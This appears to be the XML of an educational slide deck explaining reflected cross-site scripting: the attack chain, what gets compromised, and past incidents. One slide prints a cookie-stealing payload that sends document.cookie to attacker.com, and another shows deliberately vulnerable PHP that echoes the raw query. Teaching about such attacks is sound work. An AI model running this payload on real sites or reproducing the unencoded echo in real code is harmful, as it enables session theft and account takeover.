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Crimson Pro Semi Bold" panose="020B0604020202020204" charset="0"/>
      <p:regular r:id="rId12"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Heebo" panose="020F0502020204030204" pitchFamily="2" charset="-79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17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453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Understanding Reflected XSS: How It Works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deep dive into one of the web's most common security vulnerabilities, exploring its mechanics, real-world impact, and practical attack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760" y="800695"/>
            <a:ext cx="1955244" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6517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752" y="911781"/>
            <a:ext cx="170617" cy="1706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0618" y="864632"/>
            <a:ext cx="144339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THREAT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6760" y="1273850"/>
            <a:ext cx="5334714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Reflected XSS?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" y="2467570"/>
            <a:ext cx="8356759" cy="47354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31680" y="2817852"/>
            <a:ext cx="4259461" cy="198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Reflected Cross-Site Scripting (XSS) occurs when user-supplied input is immediately returned in a web page's response without proper validation or encoding. This creates a dangerous opening for attackers to inject malicious scripts.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631680" y="4985861"/>
            <a:ext cx="4259461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 vectors include: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631680" y="5497711"/>
            <a:ext cx="4259461" cy="1325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Crafted URLs with embedded JavaScript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Phishing emails containing malicious links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Social engineering tactics to trick users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602"/>
            <a:ext cx="103224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Reflected XSS Works: The Attack Chain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401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Understanding the attack sequence reveals why reflected XSS remains so effective. Each step builds on the previous, exploiting trust between user and server.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34966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Craft Malicious URL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1594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 creates a URL containing malicious JavaScript embedded in a query parameter or form field.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534966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Victim Clicks Link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1594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Unsuspecting victim clicks the crafted link, sending the malicious request to the vulnerable web server.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534966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Server Reflects Input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159454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Server processes the request and includes the malicious input directly in its HTML response without sanitization.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5248"/>
            <a:ext cx="7819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Execution: The Final Steps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0" y="2339340"/>
            <a:ext cx="6183630" cy="366998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6926" y="3236345"/>
            <a:ext cx="526404" cy="526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7933" y="5158049"/>
            <a:ext cx="1537100" cy="29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Stolen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93" y="3237332"/>
            <a:ext cx="526404" cy="5264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210765" y="5158049"/>
            <a:ext cx="1537100" cy="29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Script Executes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52625" y="3237332"/>
            <a:ext cx="526404" cy="52640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42013" y="5009998"/>
            <a:ext cx="1537100" cy="592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Browser Receives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793790" y="6026741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attack culminates when the victim's browser executes the malicious script, treating it as legitimate code from the trusted website.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9475589" y="2084189"/>
            <a:ext cx="4531876" cy="5110163"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 751"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2150FE"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9702403" y="2324576"/>
            <a:ext cx="29454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Gets Compromised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702403" y="2905720"/>
            <a:ext cx="4078248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Session cookies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 Full account access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Authentication tokens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 Identity theft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Personal data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 Forms, passwords, sensitive info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actions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 Unauthorized transactions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702403" y="5650266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script runs with the victim's privileges, making it indistinguishable from legitimate user activity.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6222" y="1291828"/>
            <a:ext cx="6053733" cy="381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Practical Example: Vulnerable Search Parameter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06222" y="1804273"/>
            <a:ext cx="8417838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real-world scenario demonstrates how a simple search feature becomes a dangerous attack vector when input isn't properly sanitized.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106222" y="2028230"/>
            <a:ext cx="8417838" cy="1095732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1462" y="2043470"/>
            <a:ext cx="487918" cy="1065252"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2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3273981" y="2461736"/>
            <a:ext cx="18288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74983" y="2165390"/>
            <a:ext cx="1548646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Malicious URL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74983" y="2429828"/>
            <a:ext cx="7711916" cy="333018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3668911" y="2429828"/>
            <a:ext cx="7724061" cy="333018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790831" y="2521268"/>
            <a:ext cx="7480221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https://example.com/search?query=&lt;script&gt;alert('XSS')&lt;/script&gt;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74983" y="2836664"/>
            <a:ext cx="7711916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attacker embeds JavaScript directly into the search query parameter.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6222" y="3189565"/>
            <a:ext cx="8417838" cy="1546146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1462" y="3204805"/>
            <a:ext cx="487918" cy="1515666"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2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981" y="3848219"/>
            <a:ext cx="18288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4983" y="3326725"/>
            <a:ext cx="219944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Vulnerable Server-Side Code (PHP)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74983" y="3591163"/>
            <a:ext cx="7711916" cy="783431"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2336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8911" y="3591163"/>
            <a:ext cx="7724061" cy="783431"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 233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3790831" y="3682603"/>
            <a:ext cx="7480221" cy="60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$_GET['query'];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"You searched for: " . $query;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74983" y="4448413"/>
            <a:ext cx="7711916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code directly echoes user input without encoding, creating the vulnerability.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6222" y="4801314"/>
            <a:ext cx="8417838" cy="1546146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1462" y="4816554"/>
            <a:ext cx="487918" cy="1515666"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2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981" y="5459968"/>
            <a:ext cx="18288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74983" y="4938474"/>
            <a:ext cx="168937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Real-World Attack Payload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74983" y="5202912"/>
            <a:ext cx="7711916" cy="783431"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2336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3668911" y="5202912"/>
            <a:ext cx="7724061" cy="783431"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2336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3790831" y="5294352"/>
            <a:ext cx="7480221" cy="60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document.location='http://attacker.com/steal?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cookie='+document.cookie;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74983" y="6060162"/>
            <a:ext cx="7711916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payloads steal session cookies by redirecting to attacker-controlled servers, enabling complete account takeover.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6222" y="6421279"/>
            <a:ext cx="8417838" cy="516374"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3544"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B3C3FF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2" y="6573679"/>
            <a:ext cx="152400" cy="121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502462" y="6517362"/>
            <a:ext cx="7899678" cy="30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Notable Real-World Incidents:</a:t>
            </a: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Major platforms including eBay (2014), Yahoo (2013), and British Airways (2018) have all suffered reflected XSS vulnerabilities, affecting millions of users and resulting in data breaches and financial losses.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Custom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Consolas</vt:lpstr>
      <vt:lpstr>Heebo</vt:lpstr>
      <vt:lpstr>Crimson Pro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2026-01-31T12:22:32Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-01-31T12:24:07Z</dcterms:modified>
</cp:coreProperties>
</file>